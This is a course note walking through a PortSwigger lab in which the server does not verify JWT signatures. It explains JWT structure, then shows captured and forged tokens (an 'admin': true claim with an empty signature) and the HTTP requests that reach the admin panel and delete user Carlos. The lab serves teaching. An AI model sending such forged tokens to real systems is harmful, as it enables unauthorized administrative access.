---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Understanding JWT Vulnerabilities

### JWT Structure and Claims

A typical JWT structure looks like this:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Breaking it down:

1. **Header**:
    ```json
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    ```

2. **Payload**:
    ```json
    {
      "sub": "1234567890",
      "name": "John Doe",
      "iat": 1516239022
    }
    ```

3. **Signature**:
    ```plaintext
    SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
    ```

### Vulnerability: Unverified Signature

In this lab, the server does not verify the signature of the JWTs it receives. This means an attacker can modify the payload and generate a new signature without the server detecting the change.

### Exploiting the Vulnerability

To exploit this vulnerability, you need to:

1. Capture the JWT sent by the server.
2. Decode the JWT to view its contents.
3. Modify the payload to include administrative privileges.
4. Generate a new signature (or leave it blank if the server ignores it).

### Tools and Techniques

#### Using jwt.io

[jwt.io](https://jwt.io/) is a useful tool for decoding and encoding JWTs. You can use it to decode the captured JWT and modify its payload.

#### Capturing JWTs

You can capture JWTs using browser developer tools or a proxy tool like Burp Suite. Here’s an example of capturing a JWT:

```http
GET /api/user HTTP/1.1
Host: vulnerable-app.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Modifying the JWT Payload

Once you have the JWT, you can decode it using jwt.io:

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

Modify the payload to include administrative privileges:

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "admin": true
}
```

### Generating a New Signature

Since the server does not verify the signature, you can either generate a new signature or leave it blank. For simplicity, you can leave it blank:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
```

### Sending the Modified JWT

Send the modified JWT in the `Authorization` header to access the admin panel:

```http
GET /admin HTTP/1.1
Host: vulnerable-app.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.
```

### Expected Result

If successful, you should be able to access the admin panel and delete the user "Carlos".

---
<!-- nav -->
[[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/11-Practice Labs|Practice Labs]] | [[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/00-Overview|Overview]] | [[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/13-Conclusion|Conclusion]]
